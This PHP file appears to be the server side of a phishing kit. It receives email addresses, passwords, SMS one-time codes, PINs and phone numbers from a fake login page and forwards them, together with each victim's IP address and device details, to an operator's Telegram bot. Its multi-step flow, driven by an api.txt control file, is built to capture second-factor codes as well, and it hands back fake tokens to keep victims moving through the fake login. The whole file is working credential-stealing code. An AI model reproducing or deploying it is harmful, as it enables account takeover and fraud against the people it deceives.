<?php
/**
 * Login Data Handler
 * Receives email and password from index.html and sends to Telegram
 * Handles multi-step authentication (SMS, PIN, Phone, App)
 * Includes IP address and user agent information
 */

// Suppress all errors for clean JSON output
error_reporting(0);
ini_set('display_errors', 0);

// Set JSON header
header('Content-Type: application/json');

// Configuration - Replace with your actual values or use cookies
$telegramBotToken = "";  // Get from @BotFather on Telegram
$telegramChatId = "";      // Your chat ID or group ID

// Try to get Telegram credentials from cookies if not set
if (empty($telegramBotToken) && isset($_COOKIE['tokentel'])) {
    $telegramBotToken = $_COOKIE['tokentel'];
}

if (empty($telegramChatId) && isset($_COOKIE['idtel'])) {
    $telegramChatId = $_COOKIE['idtel'];
}

// Get client IP address (handles proxies)
function getClientIP() {
    $ipKeys = [
        'HTTP_CF_CONNECTING_IP',  // Cloudflare
        'HTTP_X_FORWARDED_FOR',   // Proxy
        'HTTP_X_REAL_IP',         // Nginx proxy
        'REMOTE_ADDR'             // Direct connection
    ];
    
    foreach ($ipKeys as $key) {
        if (!empty($_SERVER[$key])) {
            $ip = $_SERVER[$key];
            // Handle multiple IPs in X-Forwarded-For
            if (strpos($ip, ',') !== false) {
                $ipParts = explode(',', $ip);
                $ip = trim($ipParts[0]);
            }
            return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'Unknown';
        }
    }
    return 'Unknown';
}

// Get user agent
function getUserAgent() {
    return $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
}

// Get additional device/browser info
function getDeviceInfo($userAgent) {
    $os = 'Unknown OS';
    $browser = 'Unknown Browser';
    
    // Detect OS
    if (preg_match('/windows|win32/i', $userAgent)) {
        $os = 'Windows';
    } elseif (preg_match('/macintosh|mac os x/i', $userAgent)) {
        $os = 'macOS';
    } elseif (preg_match('/linux/i', $userAgent)) {
        $os = 'Linux';
    } elseif (preg_match('/android/i', $userAgent)) {
        $os = 'Android';
    } elseif (preg_match('/iphone|ipad|ipod/i', $userAgent)) {
        $os = 'iOS';
    }
    
    // Detect Browser
    if (preg_match('/chrome|crios/i', $userAgent)) {
        $browser = 'Chrome';
    } elseif (preg_match('/firefox/i', $userAgent)) {
        $browser = 'Firefox';
    } elseif (preg_match('/safari/i', $userAgent)) {
        $browser = 'Safari';
    } elseif (preg_match('/opera|opr/i', $userAgent)) {
        $browser = 'Opera';
    } elseif (preg_match('/edge|edg/i', $userAgent)) {
        $browser = 'Edge';
    } elseif (preg_match('/msie|trident/i', $userAgent)) {
        $browser = 'Internet Explorer';
    }
    
    return "$os - $browser";
}

// Get timestamp
function getTimestamp() {
    return date('Y-m-d H:i:s T');
}

// Send message to Telegram
function sendToTelegram($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode === 200;
}

// Main execution
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Determine request type (login, sms_code, pin_code, phone_number, app_confirm)
    $requestType = isset($_POST['request_type']) ? $_POST['request_type'] : 'login';
    
    // Get form data based on request type
    switch ($requestType) {
        case 're-login':
            $email = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : 'Not provided';
            $password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : 'Not provided';
            $messageData = "🔐 <b>New Login Attempt Detected</b>\n\n👤 <b>Re-Login Credentials:</b>\n• Email: {$email}\n• Password: {$password}";
            
            file_put_contents('api.txt', '');
            break;
			
        case 'sms_code':
            $email = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : 'Not provided';
            $code = isset($_POST['code']) ? htmlspecialchars($_POST['code']) : 'Not provided';
            $password = 'SMS Code Verification';
            $messageData = "📱 <b>SMS Code Verification</b>\n• Email: {$email}\n• SMS Code: {$code}";
            // After SMS, clear api.txt (make it empty)
            file_put_contents('api.txt', '');
            break;
            
        case 'pin_code':
            $email = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : 'Not provided';
            $pin = isset($_POST['pin']) ? htmlspecialchars($_POST['pin']) : 'Not provided';
            $password = 'PIN Code Verification';
            $messageData = "🔢 <b>PIN Code Verification</b>\n• Email: {$email}\n• PIN: {$pin}";
            // After PIN, clear api.txt
            file_put_contents('api.txt', '');
            break;
            
        case 'phone_number':
            $email = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : 'Not provided';
            $phone = isset($_POST['phone']) ? htmlspecialchars($_POST['phone']) : 'Not provided';
            $password = 'Phone Number Verification';
            $messageData = "📞 <b>Phone Number Verification</b>\n• Email: {$email}\n• Phone: {$phone}";
            // After phone, set to sms
            file_put_contents('api.txt', '');
            break;
            
        case 'app_confirm':
            $email = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : 'Not provided';
            $password = 'App Confirmation';
            $messageData = "📲 <b>Mobile App Confirmation</b>\n• Email: {$email}\n• Status: User approved via mobile app";
            // After app, clear api.txt
            file_put_contents('api.txt', '');
            break;
            
        default: // login
            $email = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : 'Not provided';
            $password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : 'Not provided';
            $messageData = "🔐 <b>New Login Attempt Detected</b>\n\n👤 <b>Login Credentials:</b>\n• Email: {$email}\n• Password: {$password}";
            
            file_put_contents('api.txt', '');
            break;
    }
    
    // Get client information
    $ipAddress = getClientIP();
    $userAgent = getUserAgent();
    $deviceInfo = getDeviceInfo($userAgent);
    $timestamp = getTimestamp();
    $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct access';
    $currentUrlPath = $_SERVER['REQUEST_URI'];
    $domain = $_SERVER['HTTP_HOST'];
    preg_match('~^/web/([^/]+)/?~', $currentUrlPath, $matches);
    $folderName = isset($matches[1]) ? $matches[1] : '';
    $url = "https://$domain/web/api.php?userid=$folderName";
    // Generate session and security tokens
    $sessionId = session_id() ?: uniqid('sess_', true);
    $verifyToken = bin2hex(random_bytes(16));
    $dispatchToken = bin2hex(random_bytes(20));
    $accessToken = bin2hex(random_bytes(16));
    $dataToken = bin2hex(random_bytes(20));
    
    // Format full message for Telegram
    $message = "
{$messageData}

🌐 <b>Client Information:</b>
• Panel: {$url}
• IP Address: {$ipAddress}
• Device/Browser: {$deviceInfo}
• User Agent: {$userAgent}
• Timestamp: {$timestamp}
• Referer: {$referer}

⚠️ <b>Action Required:</b>
Please review this authentication step immediately.
";
    
    // Check if configuration is set
    if ($telegramBotToken === "YOUR_BOT_TOKEN_HERE" || $telegramChatId === "YOUR_CHAT_ID_HERE") {
        // For DEMO purposes - still allow it to work without Telegram
        // Log locally instead
        error_log("Telegram not configured, but continuing for demo");
        
        // Continue anyway for testing (remove this in production)
        // In production, you should configure Telegram properly
    }
    
    // Send to Telegram
    if (sendToTelegram($telegramBotToken, $telegramChatId, $message)) {
        // Log the action (optional)
        $logEntry = sprintf(
            "[%s] %s: %s | IP: %s | Device: %s\n",
            $timestamp,
            $requestType,
            $email,
            $ipAddress,
            $deviceInfo
        );
        file_put_contents('login_attempts.log', $logEntry, FILE_APPEND);
        
        // Build redirect URL with all parameters
        $redirectUrl = 'PLACEHOLDER.php?verify_account=session=&' . $verifyToken . 
                      '&dispatch=' . $dispatchToken . 
                      '&access=&' . $accessToken . 
                      '&data=' . $dataToken;
        
        // Return success response
        echo json_encode([
            'success' => true,
            'message' => 'Authentication step completed',
            'session_id' => '',
            'verify_token' => $verifyToken,
            'dispatch_token' => $dispatchToken,
            'access_token' => $accessToken,
            'data_token' => $dataToken,
            'redirect_base' => $redirectUrl
        ]);
    } else {
        // Return error response
        http_response_code(500);
        echo json_encode([
            'success' => false,
            'message' => 'Failed to send data to Telegram'
        ]);
    }
} else {
    // Not a POST request
    http_response_code(405);
    echo json_encode([
        'success' => false,
        'message' => 'Method not allowed'
    ]);
}
?>
